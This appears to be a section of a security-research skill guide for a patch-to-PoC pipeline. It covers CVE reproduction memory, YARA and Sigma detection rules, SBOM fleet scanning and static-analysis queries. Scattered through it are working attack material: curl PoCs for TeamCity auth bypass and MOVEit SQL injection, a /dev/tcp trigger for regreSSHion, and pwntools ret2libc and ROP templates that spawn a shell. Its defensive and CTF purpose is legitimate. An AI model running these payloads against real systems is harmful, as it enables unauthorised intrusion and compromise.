    "build_env": "ubuntu:22.04 + build-essential + ASan/UBSan"
  },
  "patch_analysis": {
    "files_changed": [],
    "lines_added": 0,
    "lines_removed": 0,
    "key_change": "",
    "suspected_vuln_function": "",
    "suspected_vuln_type": "",
    "confidence": 0.0
  },
  "code_path": {
    "entry_function": "",
    "call_chain_to_vuln": [],
    "input_to_vuln_distance": -1
  },
  "candidate_inputs": [],
  "verification_results": {},
  "convergence_state": {
    "iterations": 0,
    "status": "IN_PROGRESS",
    "stop_condition_met": false,
    "next_action": "Phase 1: Patch analysis",
    "failed_attempts": 0,
    "path_switch_threshold": 3
  }
}
```

### §15.2 Memory lock + version vector (multi-agent)

```json
{
  "memory_lock": {
    "version": 1,
    "owner_agents": ["A"],
    "last_read_at": "2026-07-03T10:00:00Z",
    "last_write_at": "2026-07-03T10:05:00Z",
    "last_write_by": "A"
  }
}
```

---

## §16. Memory Delta Writing Per Phase

### §16.1 Phase 1 delta

```bash
tmp=$(mktemp)
jq --slurpfile base /work/repro-attempt-memory.json -n '
  $base[0] + {
    "patch_analysis": {
      "files_changed": ["src/dec/huffman_dec.c"],
      "lines_added": 14,
      "lines_removed": 3,
      "key_change": "Added overflow check on Huffman table size",
      "suspected_vuln_function": "BuildHuffmanTable()",
      "suspected_vuln_type": "heap-buffer-overflow",
      "confidence": 0.85
    },
    "convergence_state": ($base[0].convergence_state + {
      "iterations": ($base[0].convergence_state.iterations + 1),
      "next_action": "Phase 2: Code path walking"
    }),
    "memory_lock": ($base[0].memory_lock + {
      "version": ($base[0].memory_lock.version + 1),
      "last_write_at": (now | todate),
      "last_write_by": "A"
    })
  }' > "$tmp" && mv "$tmp" /work/repro-attempt-memory.json
```

### §16.2 Phase 2 delta

```bash
tmp=$(mktemp)
jq '.code_path = {
  "entry_function": "WebPDecode() → VP8LDecodeHeader()",
  "call_chain_to_vuln": ["WebPDecode", "VP8LDecodeImageStream", "VP8LDecodeHeader", "VP8LBuildHuffmanTable", "BuildHuffmanTable"],
  "input_to_vuln_distance": 4
} | .convergence_state.iterations += 1 | .convergence_state.next_action = "Phase 3: PoC generation"' \
  /work/repro-attempt-memory.json > "$tmp" && mv "$tmp" /work/repro-attempt-memory.json
```

### §16.3 Phase 3 delta

```bash
tmp=$(mktemp)
jq '.candidate_inputs += [
  {
    "id": "IN-001",
    "shape": "VP8L-encoded WebP with Huffman code-length sequence yielding 2^31+ table entries",
    "expected_trigger": "heap-buffer-overflow in BuildHuffmanTable",
    "test_status": "VULNERABLE_CRASHED",
    "asan_evidence": "ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200005cfe1"
  }
] | .convergence_state.iterations += 1' \
  /work/repro-attempt-memory.json > "$tmp" && mv "$tmp" /work/repro-attempt-memory.json
```

### §16.4 Phase 4 delta (the stop event)

```bash
tmp=$(mktemp)
jq '.verification_results = {
  "vulnerable": {"crashed": true, "sanitizer_output": "ERROR: AddressSanitizer: heap-buffer-overflow ..."},
  "patched": {"crashed": false, "sanitizer_output": "clean"}
} | .convergence_state = {
  "iterations": 4,
  "status": "POC_CONFIRMED_DIFFERENTIALLY",
  "stop_condition_met": true,
  "stop_reason": "verification_results.vulnerable.crashed=true AND verification_results.patched.crashed=false",
  "next_action": "Phase 5: Detection rule authoring"
}' /work/repro-attempt-memory.json > "$tmp" && mv "$tmp" /work/repro-attempt-memory.json
```

---

## §17. Convergence Event Emission

### §17.1 Event log format

```bash
# Append-only JSONL log of convergence events
cat >> /work/convergence-events.jsonl <<EOF
{"event":"PHASE_1_DONE","ts":"$(date -u +%FT%TZ)","iterations":1,"patch_analysis.confidence":0.85}
{"event":"PHASE_2_DONE","ts":"$(date -u +%FT%TZ)","iterations":2,"code_path.input_to_vuln_distance":4}
{"event":"PHASE_3_DONE","ts":"$(date -u +%FT%TZ)","iterations":3,"candidate_inputs_count":1}
{"event":"POC_CONFIRMED_DIFFERENTIALLY","ts":"$(date -u +%FT%TZ)","iterations":4,"stop_condition_met":true}
EOF
```

### §17.2 Subscribe / aggregate events

```bash
# Tail the event log
tail -f /work/convergence-events.jsonl | jq .

# Aggregate stop events
jq 'select(.event=="POC_CONFIRMED_DIFFERENTIALLY") | {ts, iterations}' \
  /work/convergence-events.jsonl
```

---

## §18. Anti-Pattern Checker (Premature Stop Detection)

### §18.1 Premature stop detector

```bash
cat > /work/scripts/anti_pattern_check.sh <<'BASH'
#!/bin/bash
# Detect "Premature stop" anti-pattern
MEM=/work/repro-attempt-memory.json

stop_met=$(jq -r '.convergence_state.stop_condition_met' "$MEM")
v_crashed=$(jq -r '.verification_results.vulnerable.crashed // empty' "$MEM")
p_crashed=$(jq -r '.verification_results.patched.crashed // empty' "$MEM")

if [ "$stop_met" = "true" ]; then
  if [ "$v_crashed" != "true" ] || [ "$p_crashed" != "false" ]; then
    echo "[ANTI-PATTERN] Premature stop: stop_condition_met=true but"
    echo "  vulnerable.crashed=$v_crashed patched.crashed=$p_crashed"
    exit 2
  fi
fi

# Repeat-without-delta detection
failed=$(jq -r '.convergence_state.failed_attempts // 0' "$MEM")
threshold=$(jq -r '.convergence_state.path_switch_threshold // 3' "$MEM")
if [ "$failed" -ge "$threshold" ]; then
  echo "[ANTI-PATTERN] Repeat-without-delta: failed_attempts=$failed >= threshold=$threshold"
  echo "[ANTI-PATTERN] Force path switch"
  jq '.convergence_state.active_path = (.convergence_state.candidate_paths[1] // "unknown")' \
    "$MEM" > /tmp/m.json && mv /tmp/m.json "$MEM"
fi
BASH
chmod +x /work/scripts/anti_pattern_check.sh
```

### §18.2 Free-form exploration detector

```bash
# Agent writes without prior read = red flag
last_read=$(jq -r '.memory_lock.last_read_at // empty' "$MEM")
last_write=$(jq -r '.memory_lock.last_write_at // empty' "$MEM")

if [ -z "$last_read" ] && [ -n "$last_write" ]; then
  echo "[ANTI-PATTERN] Free-form exploration: write without prior read"
  exit 2
fi
```

### §18.3 Path-claim deadlock detector (multi-agent)

```bash
# Two agents claiming the same path
active=$(jq -r '.active_paths | to_entries | map(.value) | unique' /work/multi-agent-state.json)
counts=$(jq -r '.active_paths | to_entries | map(.value) | group_by(.) | map({path: .[0], count: length})' /work/multi-agent-state.json)
dups=$(echo "$counts" | jq '[.[] | select(.count > 1)]')
if [ "$dups" != "[]" ]; then
  echo "[ANTI-PATTERN] Path-claim deadlock: $dups"
fi
```

---

## §19. YARA Rule Authoring for Vulnerable Pattern Detection

### §19.1 Source-pattern YARA (file scanning)

```yara
rule CVE_2023_4863_libwebp_huffman_overflow_src {
    meta:
        description = "libwebp BuildHuffmanTable heap-buffer-overflow (CVE-2023-4863) — source pattern"
        cve         = "CVE-2023-4863"
        cvss        = 8.8
        patched_in  = "libwebp 1.3.2"
        author      = "kali-claw patch-to-poc-pipeline"
        date        = "2026-07-03"
    strings:
        $vuln_func_src = "BuildHuffmanTable"
        $table_accum    = "root_table + table_size"
        $no_guard       = "table_size <\\s*\\d+" nocase
    condition:
        $vuln_func_src at 0 and $table_accum and not $no_guard
}
```

### §19.2 Binary-pattern YARA (compiled .so scanning)

```yara
rule CVE_2023_4863_libwebp_huffman_overflow_bin {
    meta:
        description = "libwebp vulnerable BuildHuffmanTable in compiled binary (CVE-2023-4863)"
        cve         = "CVE-2023-4863"
        author      = "kali-claw patch-to-poc-pipeline"
    strings:
        $bin_symbol = "BuildHuffmanTable" ascii
        $version    = "libwebp 1.3.1" ascii
    condition:
        $bin_symbol and $version
}
```

### §19.3 Backdoor pattern YARA (xz-utils class)

```yara
rule CVE_2024_3094_xz_backdoor {
    meta:
        description = "xz-utils backdoor (CVE-2024-3094) — IFUNC hook in liblzma"
        cve         = "CVE-2024-3094"
        cvss        = 10.0
        author      = "kali-claw patch-to-poc-pipeline"
    strings:
        $ifunc        = "_get_cpuid" ascii
        $rsa_oid      = { 06 03 55 04 03 }  // X.509 v3 subject OID
        $obf_func     = "_liblzma_la_ifunc"
        $ssh_hook     = "RSA_public_decrypt"
    condition:
        any of ($ifunc, $obf_func) and $ssh_hook
}
```

### §19.4 Differential YARA test

```bash
# A correct rule MUST match the vulnerable .so and MUST NOT match the patched .so
yara -s /work/rules/CVE-2023-4863.yar /targets/libwebp-1.3.1.so   # MUST match
yara -s /work/rules/CVE-2023-4863.yar /targets/libwebp-1.3.2.so   # MUST NOT match

# Test the backdoor rule against known good vs malicious liblzma
yara -s /work/rules/CVE-2024-3094.yar /targets/liblzma-5.4.6.so   # clean
yara -s /work/rules/CVE-2024-3094.yar /targets/liblzma-5.6.0.so   # backdoored
```

---

## §20. YARA Testing Against Vuln + Patched Binaries

### §20.1 Batch differential YARA test

```bash
cat > /work/scripts/yara_diff_test.sh <<'BASH'
#!/bin/bash
# Differential YARA test — must fire on vuln, silent on patched
RULE=$1
VULN=$2
PATCHED=$3

v_match=$(yara "$RULE" "$VULN" | wc -l)
p_match=$(yara "$RULE" "$PATCHED" | wc -l)

echo "vulnerable_matches=$v_match patched_matches=$p_match"

if [ "$v_match" -ge 1 ] && [ "$p_match" -eq 0 ]; then
  echo "PASS: differential YARA rule works"
  exit 0
elif [ "$v_match" -eq 0 ]; then
  echo "FAIL: rule does NOT match vulnerable binary"
  exit 1
elif [ "$p_match" -ge 1 ]; then
  echo "FAIL: rule FALSE POSITIVES on patched binary"
  exit 2
fi
BASH
chmod +x /work/scripts/yara_diff_test.sh
/work/scripts/yara_diff_test.sh /work/rules/CVE-2023-4863.yar \
  /targets/libwebp-1.3.1.so /targets/libwebp-1.3.2.so
```

### §20.2 Recursive fleet scan

```bash
# Scan every .so under a directory
find /targets/ -name '*.so*' -type f | while read -r so; do
  match=$(yara /work/rules/CVE-2023-4863.yar "$so")
  if [ -n "$match" ]; then
    echo "MATCH: $so -> $match"
  fi
done
```

---

## §21. Sigma Rule Authoring for Exploitation Detection

### §21.1 Process-load telemetry (libwebp class)

```yaml
title: Potential CVE-2023-4863 libwebp Exploitation
id: 7c4f8a9b-1e2d-4a3b-9c5d-7e8f9a0b1c2d
status: experimental
description: Detects processes loading a vulnerable libwebp and accessing crafted WebP inputs.
author: kali-claw patch-to-poc-pipeline
date: 2026/07/03
logsource:
    product: linux
    service: sysmon_linux
detection:
    selection_load:
        ImageLoaded|endswith:
            - '/libwebp.so.7.0.3'
            - '/libwebp.so.7.0.4'
            - '/libwebp.so.7.0.5'
    selection_file:
        CommandLine|contains: ['.webp', '.webm']
    condition: selection_load and selection_file
falsepositives:
    - Legitimate WebP processing on patched systems
level: medium
tags: [attack.initial-access, attack.t1190, cve.2023-4863]
```

### §21.2 Auth-bypass telemetry (MOVEit class)

```yaml
title: CVE-2023-34362 MOVEit SQLi — Access to Unauthorized Folders
id: 9d5e8f1c-2b3a-4c5d-8e6f-0a1b2c3d4e5f
status: experimental
description: Detects exploitation of CVE-2023-34362 MOVEit Transfer SQLi via crafted guestaccess.aspx payloads.
author: kali-claw patch-to-poc-pipeline
date: 2026/07/03
references:
    - https://www.mandiant.com/resources/blog/moveit-data-theft-impact
logsource:
    product: windows
    service: iis
detection:
    selection:
        cs-method: POST
        cs-uri-query|contains:
            - '/guestaccess.aspx'
            - "machine'"
            - 'union'
            - 'select'
    condition: selection
falsepositives:
    - Legitimate guest access (rare)
level: high
tags: [attack.initial_access, attack.t1190, cve.2023-34362]
```

### §21.3 RegreSSHion SSH exploit telemetry

```yaml
title: CVE-2024-6387 regreSSHion — Child SSH Process Crash
id: a1b2c3d4-e5f6-4a5b-9c8d-7e8f9a0b1c2d
status: experimental
description: Detects child process of sshd dying with SIGALRM (CVE-2024-6387 signal handler race).
author: kali-claw patch-to-poc-pipeline
date: 2026/07/03
logsource:
    product: linux
    service: syslog
detection:
    selection:
        prog: sshd
        msg|contains:
            - 'exited on signal'
            - 'SIGALRM'
    condition: selection
falsepositives:
    - Slow networks causing legitimate timeout
level: medium
tags: [attack.initial_access, attack.t1190, cve.2024-6387]
```

---

## §22. Sigma Check + Backend Conversion

### §22.1 Validate Sigma syntax

```bash
sigma check /work/rules/CVE-2023-4863-sigma.yml
# Output: "OK — rule is valid"
```

### §22.2 Convert to Splunk SPL

```bash
sigma convert -t splunk /work/rules/CVE-2023-4863-sigma.yml
# Output:
# (ImageLoaded="*\\libwebp.so.7.0.3" OR ImageLoaded="*\\libwebp.so.7.0.4" OR ImageLoaded="*\\libwebp.so.7.0.5")
# AND (CommandLine="*.webp*" OR CommandLine="*.webm*")
```

### §22.3 Convert to Microsoft Sentinel KQL

```bash
sigma convert -t kql /work/rules/CVE-2023-34362-sigma.yml
```

### §22.4 Convert to Elastic EQL

```bash
sigma convert -t eql /work/rules/CVE-2024-6387-sigma.yml
```

### §22.5 Backend coverage test

```bash
# Ensure every Sigma rule successfully converts to every backend
for rule in /work/rules/*.yml; do
  for backend in splunk kql eql; do
    if sigma convert -t $backend "$rule" > /dev/null 2>&1; then
      echo "OK   $rule -> $backend"
    else
      echo "FAIL $rule -> $backend"
    fi
  done
done
```

---

## §23. SBOM-Driven Fleet Scanning

### §23.1 Generate SBOM with syft

```bash
# Container image
syft /targets/production-image:latest -o cyclonedx-json > /work/sbom.json

# Directory
syft dir:/targets/ -o cyclonedx-json > /work/sbom-dir.json

# Query for vulnerable package versions
jq '.components[] | select(.name=="libwebp") | {name, version, purl}' /work/sbom.json
```

### §23.2 Match vulnerabilities with grype

```bash
grype sbom:/work/sbom.json --only-fixed | grep libwebp
# NAME    INSTALLED  FIXED-IN  TYPE  VULNERABILITY  SEVERITY
# libwebp 1.3.1      1.3.2     deb   CVE-2023-4863  High

# Fail CI on High+ findings
grype sbom:/work/sbom.json --fail-on=high
```

### §23.3 Cross-reference SBOM with the new YARA rule

```bash
# Find every artifact whose version matches the vulnerable pattern
jq -r '.components[] | select(.name=="libwebp" and .version != "1.3.2") | .purl' /work/sbom.json | \
  while read purl; do
    # Resolve purl to filesystem path (image:tag, dir, etc.)
    path=$(echo "$purl" | sed 's|pkg:||; s|@|/|')
    yara /work/rules/CVE-2023-4863.yar "$path"
  done
```

### §23.4 SBOM-driven vulnerability management lifecycle

```bash
# 1. Snapshot baseline SBOM
syft production:latest -o json > /work/baseline-sbom.json

# 2. After patch release, regenerate
syft production:patched -o json > /work/patched-sbom.json

# 3. Diff to confirm fix
jq -r '.components[] | select(.name=="libwebp") | .version' \
  /work/baseline-sbom.json /work/patched-sbom.json
```

---

## §24. Compiler Flag Mitigation Review

### §24.1 Audit build flags for missing mitigations

```bash
# Check if a binary was compiled with ASan (look for __asan symbols)
nm /targets/libwebp-1.3.1.so | grep -c __asan
# 0 = no ASan (vulnerable build as shipped)

# Check for stack canaries
readelf -s /targets/libwebp-1.3.1.so | grep __stack_chk_fail
# Present = -fstack-protector enabled

# Check for FORTIFY_SOURCE
readelf -s /targets/libwebp-1.3.1.so | grep _chk
# __sprintf_chk, __memcpy_chk, etc. = FORTIFY enabled

# Check for CET (Intel CET / -fcf-protection)
readelf -n /targets/libwebp-1.3.1.so | grep -i cet
```

### §24.2 Recommended hardening flags per bug class

```bash
# Memory corruption
HARDEN_MEMCORR="-fsanitize=address,undefined -D_FORTIFY_SOURCE=3 -fstack-protector-strong -fstack-clash-protection"

# Integer overflow
HARDEN_INTOVERFLOW="-fsanitize=undefined,signed-integer-overflow -ftrapv"

# Race condition
HARDEN_RACE="-fsanitize=thread"

# Type confusion
HARDEN_TYPECONF="-fsanitize=undefined -fcf-protection=full"

# Format string
HARDEN_FMTSTR="-Wformat -Wformat-security -D_FORTIFY_SOURCE=3"
```

### §24.3 CI gate: block PRs that remove sanitizer flags

```bash
# In the project's CI YAML:
if git diff origin/main...HEAD -- Makefile.am configure.ac | \
   grep -E '^-\s*-fsanitize=address|^-\s*-D_FORTIFY_SOURCE'; then
  echo "[!] PR removes sanitizer flags — block"
  exit 1
fi
```

---

## §25. Static Analyzer Queries

### §25.1 CodeQL — allocation-size taint queries

```bash
# Run the allocation-size taint query suite
codeql database create /work/<pkg>-db --language=cpp \
  --command="make" --source-root=/targets/<pkg>-<vuln_ver>/

codeql database run-queries /work/<pkg>-db \
  codeql-repo/cpp/ql/src/Likely%20Bugs/Allocation/TaintedAllocation.ql \
  --format=csv > /work/codeql-tainted-alloc.csv

codeql database run-queries /work/<pkg>-db \
  codeql-repo/cpp/ql/src/Likely%20Bugs/Arithmetic/BadAdditionOverflow.ql \
  --format=csv > /work/codeql-intoverflow.csv
```

### §25.2 Semgrep — C/C++ arithmetic-to-alloc pattern

```yaml
# /work/semgrep/arithmetic-to-alloc.yml
rules:
  - id: cpp.arithmetic-to-alloc-without-overflow-check
    patterns:
      - pattern: |
          size_t $N = ...;
          ...
          $ALLOC($N * $M);
      - pattern-not-inside: |
          if ($N > $MAX) ...
          ...
    message: "Arithmetic feeding allocation without overflow check"
    languages: [c, cpp]
    severity: WARNING
```

```bash
semgrep --config /work/semgrep/arithmetic-to-alloc.yml \
  /targets/<pkg>-<vuln_ver>/src/ > /work/semgrep-results.json
```

### §25.3 Coverity — TAINTED_SCALAR

```bash
# Coverity is commercial; output looks like:
# CID 12345 (#1 of 1): TAINTED_SCALAR (CWE-20)
# 1. tainted_data: tainted data propagated from <api>_decode()
# 2. tainted_data_return: ... reaches calloc(size)
```

### §25.4 CodeQL custom query — Phase 1 hypothesis validation

```
/**
 * @name Custom: uncontrolled allocation size in vulnerable function
 * @description Validate Phase 1 hypothesis — find tainted alloc in BuildHuffmanTable
 * @kind problem
 * @id cpp/custom-tainted-alloc
 */
import cpp
import semmle.code.cpp.dataflow.TaintTracking
import semmle.code.cpp.models Alloc

from Function vulnFn, FunctionCall alloc, Expr tainted
where
  vulnFn.getName() = "BuildHuffmanTable" and
  alloc.getEnclosingFunction() = vulnFn and
  alloc.getTarget().hasGlobalName("calloc") and
  tainted = alloc.getArgument(0) and
  TaintTracking::reachesTaint(vulnFn.getEntryBB(), tainted)
select alloc, "Tainted size in calloc inside " + vulnFn.getName()
```

---

## §26. Reproduction Report Generation

### §26.1 Markdown report

```bash
cat > /work/repro-report.md <<MD
# CVE-XXXX-YYYYY Reproduction Report

**Generated**: $(date -u +%FT%TZ)
**Pipeline**: kali-claw patch-to-poc-pipeline (Wave 12)
**Schema**: Schema 3 reproduction memory

## Phase 1 — Patch Analysis

$(jq -r '.patch_analysis | to_entries[] | "- **\(.key)**: \(.value)"' /work/repro-attempt-memory.json)

## Phase 2 — Code Path

$(jq -r '.code_path | to_entries[] | "- **\(.key)**: \(.value)"' /work/repro-attempt-memory.json)

## Phase 3 — Candidate Inputs

$(jq -r '.candidate_inputs[] | "### \(.id)\n- Shape: \(.shape)\n- Expected: \(.expected_trigger)\n- Status: \(.test_status)\n- ASan: \(.asan_evidence)"' /work/repro-attempt-memory.json)

## Phase 4 — Differential Verification

- **Vulnerable crashed**: $(jq -r '.verification_results.vulnerable.crashed' /work/repro-attempt-memory.json)
- **Patched crashed**: $(jq -r '.verification_results.patched.crashed' /work/repro-attempt-memory.json)
- **Stop condition met**: $(jq -r '.convergence_state.stop_condition_met' /work/repro-attempt-memory.json)

## Phase 5 — Detection Rules

- YARA: \`/work/rules/CVE-XXXX-YYYYY.yar\` (passes differential test)
- Sigma: \`/work/rules/CVE-XXXX-YYYYY-sigma.yml\` (validated, converts to splunk/kql/eql)
MD
```

### §26.2 JSON snapshot (CyberGym submission)

```bash
jq '{cve: .task.cve, memory: ., events: (input_filename="/work/convergence-events.jsonl" | .)}' \
  /work/repro-attempt-memory.json > /work/repro-snapshot.json
```

---

## §27. CyberGym Submission Format

### §27.1 Per-instance submission

```json
{
  "instance_id": "CVE-2023-4863-libwebp-001",
  "task": {
    "cve": "CVE-2023-4863",
    "vulnerable_version": "libwebp-1.3.1",
    "patched_version": "libwebp-1.3.2"
  },
  "result": {
    "convergence_state": "POC_CONFIRMED_DIFFERENTIALLY",
    "stop_condition_met": true,
    "iterations": 4
  },
  "artifacts": {
    "poc_input": "/work/crashes/crash-POC",
    "yara_rule": "/work/rules/CVE-2023-4863.yar",
    "sigma_rule": "/work/rules/CVE-2023-4863-sigma.yml",
    "memory_snapshot": "/work/repro-attempt-memory.json"
  }
}
```

### §27.2 Aggregated success-rate metric

```bash
# Run across a CyberGym subset
total=0
success=0
for cve in /work/cybergym-subset/*.json; do
  total=$((total + 1))
  if jq -e '.result.stop_condition_met == true' "$cve" > /dev/null 2>&1; then
    success=$((success + 1))
  fi
done
echo "success_rate: $success / $total ($(awk "BEGIN {printf \"%.1f\", $success / $total * 100}%) )"
```

---

## §28. Patch Forensics (xz-utils Special Case — Backdoor Detection)

### §28.1 Suspicious indicators in a patch

```bash
# Build-system changes in a security patch = red flag
grep -nE 'IFUNC|__attribute__\(\(ifunc|m4_include|autotools|CMakeLists' /work/CVE-2024-3094.patch

# Object/archive files embedded in patch
grep -nE '^\+\s*.*\.(o|a|so)' /work/CVE-2024-3094.patch

# Tests being removed
grep -nE '^-\s*(test_|tests/)' /work/CVE-2024-3094.patch

# M4 macros for build hooks
grep -nE 'm4_define|m4_include|AC_SUBST' /work/CVE-2024-3094.patch
```

### §28.2 Static-diff forensics workflow

```bash
# Diff two source tarballs; look for non-source files
diff -rq /targets/xz-5.4.6 /targets/xz-5.6.0 | grep -v '\.c \|\.h ' | head

# Inspect tests/Makefile.am changes
diff /targets/xz-5.4.6/tests/Makefile.am /targets/xz-5.6.0/tests/Makefile.am
```

### §28.3 Behavioral forensics

```bash
# Run the patched liblzma against an SSH test harness
strace -f -e trace=ioctl,read,write \
  /targets/sshd-link-test 2>&1 | grep -E 'liblzma|ifunc'

# Inspect the IFUNC resolver
r2 -A -c 'pdf @ sym._get_cpuid' /targets/liblzma-5.6.0.so
```

### §28.4 Backdoor YARA rule

See §19.3.

---

## §29. Memory-Corruption Bug Class Workflow

| Step | Action |
|------|--------|
| 1 | Confirm patch adds a bounds check or allocation clamp |
| 2 | Identify vulnerable buffer (`char *buf`, `calloc()`, etc.) |
| 3 | Choose Strategy B (fuzzer) — memory bugs benefit from ASan feedback |
| 4 | Build harness with `-fsanitize=address,undefined` |
| 5 | Seed with corpus + boundary inputs |
| 6 | Triage crash with `asan_symbolize` |
| 7 | Differential verify (Phase 4) |
| 8 | YARA: function name + missing-guard regex |
| 9 | Sigma: process-load telemetry |

---

## §30. Integer-Overflow Bug Class Workflow

| Step | Action |
|------|--------|
| 1 | Confirm patch adds a size/max comparison (`if (size > MAX)`) |
| 2 | Identify arithmetic op feeding allocation (`size * mult`, `a + b`) |
| 3 | Strategy B (fuzzer) — manual is too unreliable for arithmetic edge cases |
| 4 | Build with `-fsanitize=undefined,signed-integer-overflow -ftrapv` |
| 5 | Seed with INT_MAX, UINT_MAX, 2^31, 2^32 boundary inputs |
| 6 | UBSan report: `runtime error: signed integer overflow` |
| 7 | Differential verify (Phase 4) |
| 8 | YARA: arithmetic-on-size pattern |
| 9 | Sigma: N/A (memory bug, no exploitation telemetry typically) |

---

## §31. Type-Confusion Bug Class Workflow

| Step | Action |
|------|--------|
| 1 | Confirm patch adds `if (obj->type == EXPECTED)` check |
| 2 | Identify the vtable / type-tag dispatch |
| 3 | Strategy B (fuzzer) — type confusion requires the right object header |
| 4 | Build with `-fsanitize=undefined -fcf-protection=full` |
| 5 | Seed with crafted object headers (mismatched type-tag + body) |
| 6 | UBSan report: `runtime error: call to function X through pointer to incorrect type Y` |
| 7 | Differential verify (Phase 4) |
| 8 | YARA: vtable / type-tag check pattern |
| 9 | Sigma: process-load telemetry |

---

## §32. Auth-Bypass Bug Class Workflow

| Step | Action |
|------|--------|
| 1 | Confirm patch adds an auth check on a route handler |
| 2 | Identify the route / endpoint in the patch |
| 3 | Strategy A (manual HTTP) — `curl` the route with crafted headers |
| 4 | Build with normal flags; no sanitizer needed (logical bug) |
| 5 | Test: unauthenticated request should fail on patched, succeed on vuln |
| 6 | Differential verify: vuln returns 200, patched returns 401/403 |
| 7 | YARA: source-level missing auth decorator |
| 8 | Sigma: HTTP request telemetry — URL pattern + missing token |

```bash
# CVE-2024-27198 TeamCity auth bypass PoC
curl -sk "https://teamcity.example.com/hax?jsp=/app/rest/server;.jsp" \
  -o /work/teamcity-leak.txt
# Vuln returns internal API data; patched returns 401
```

---

## §33. Injection Bug Class Workflow (SQLi / XSS / SSRF)

| Step | Action |
|------|--------|
| 1 | Confirm patch switches string concat to parameterized query / output encoding |
| 2 | Identify the tainted input flow (URL param, body field, cookie) |
| 3 | Strategy A (manual HTTP) — inject marker + payload |
| 4 | Build with normal flags |
| 5 | Test payload on vuln (response reflects payload or DB error) vs patched (response neutralized) |
| 6 | Differential verify: vuln response contains injection marker; patched doesn't |
| 7 | YARA: source-level string-concat-into-SQL or unescaped-output pattern |
| 8 | Sigma: HTTP request telemetry — SQL keywords in URL parameter |

```bash
# CVE-2023-34362 MOVEit SQLi PoC (manual)
curl -sk "https://moveit.example.com/guestaccess.aspx?arg=machine' UNION SELECT 1--" \
  -o /work/moveit-leak.txt
```

---

## §34. Race-Condition Bug Class Workflow

| Step | Action |
|------|--------|
| 1 | Confirm patch adds a mutex / lock / atomic op |
| 2 | Identify the shared state and the racing windows |
| 3 | Strategy B (TSan fuzzer) — manual races are nearly impossible |
| 4 | Build with `-fsanitize=thread` |
| 5 | Seed with concurrent-input corpus (multiple threads calling the API) |
| 6 | TSan report: `WARNING: ThreadSanitizer: data race` |
| 7 | Differential verify (Phase 4) |
| 8 | YARA: shared-state access without lock pattern |
| 9 | Sigma: process-level race evidence (rare) |

```bash
# CVE-2024-6387 regreSSHion — SIGALRM race in sshd
# Trigger: SSH connection that takes > LoginGraceTime seconds
( sleep 1200 & ) < /dev/tcp/target.example.com/22 &
# Wait for SIGALRM race
```

---

## §35. Detection-Rule Retirement & Lifecycle

### §35.1 Track rule lifecycle state

```yaml
# /work/rules/lifecycle.yaml
rules:
  CVE-2023-4863-sigma.yml:
    state: production
    created: 2026-07-03
    last_fp_review: 2026-07-15
    retire_after: "2027-01-03"  # 6 months after fleet-wide patch rollout
    retire_condition: "SBOM shows < 1% vulnerable libwebp in fleet"
```

### §35.2 Auto-suppress after fleet-wide patch

```bash
# SBOM shows 100% patched
patched=$(jq '[.components[] | select(.name=="libwebp")] | map(select(.version == "1.3.2")) | length' /work/sbom.json)
total=$(jq '[.components[] | select(.name=="libwebp")] | length' /work/sbom.json)
if [ "$patched" -eq "$total" ]; then
  echo "[lifecycle] Fleet fully patched — retiring CVE-2023-4863 Sigma rule"
  mv /work/rules/CVE-2023-4863-sigma.yml /work/rules/retired/CVE-2023-4863-sigma.yml
fi
```

### §35.3 Periodic FP review

```bash
# Count Sigma FP hits per week
jq '.hits | length' /work/sigma-fp-stats.json
# If FP rate > 10/week, review the rule
```

### §35.4 Reference: detection-engineering skill

Detection rule craft (Sigma syntax, FP tuning, CI/CD for rules) is owned by `detection-engineering`. This skill's Phase 5 produces *bug-specific* instances; the lifecycle discipline lives in `detection-engineering`.


---

## MITRE ATT&CK Mapping + Pwntools Templates (v0.2.5.3)

### ATT&CK 映射（F-PP-001）

| ATT&CK Technique | PoC Activity | Example |
|------------------|-------------|---------|
| **T1068 — Exploitation for Privilege Escalation** | 利用内核/服务漏洞提权 | CVE PoC for sudo/Polkit |
| **T1203 — Exploitation for Client Execution** | 客户端漏洞利用 | 浏览器/Office RCE PoC |
| **T1190 — Exploit Public-Facing Application** | Web 应用漏洞利用 | SQLi/RCE to shell |
| **T1059.004 — Unix Shell** | PoC payload 执行 | bash reverse shell |
| **T1620 — Reflective Code Loading** | 内存中加载 PoC | DLL side-loading |

### CTF Pwn 模板（F-PP-002）

#### ret2libc 模板

```python
from pwn import *

# context
context.arch = 'amd64'
elf = context.binary = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process('./vuln')

# gadgets
pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
ret = ROP(elf).find_gadget(['ret'])[0]

# leak libc
p.sendlineafter(b'> ', b'%p')  # format string leak
leak = int(p.recvline(), 16)
libc.address = leak - libc.symbols['printf']

# ret2libc
payload = flat(
    b'A' * 72,           # offset to RIP
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    ret,                  # stack alignment
    libc.symbols['system']
)
p.sendline(payload)
p.interactive()
```

#### ROP 链模板

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# execve("/bin/sh", NULL, NULL)
bin_sh = next(elf.search(b'/bin/sh\x00'))
rop.call(elf.symbols['execve'], [bin_sh, 0, 0])

payload = fit({
    72: rop.chain()  # offset + ROP chain
})
```

#### One-gadget RCE

```bash
one_gadget ./libc.so.6
# 输出 execve("/bin/sh") 的 offset + 约束条件
# 常见：0xe3b2e execve("/bin/sh", r15, r12) 约束 [r15]==NULL
```
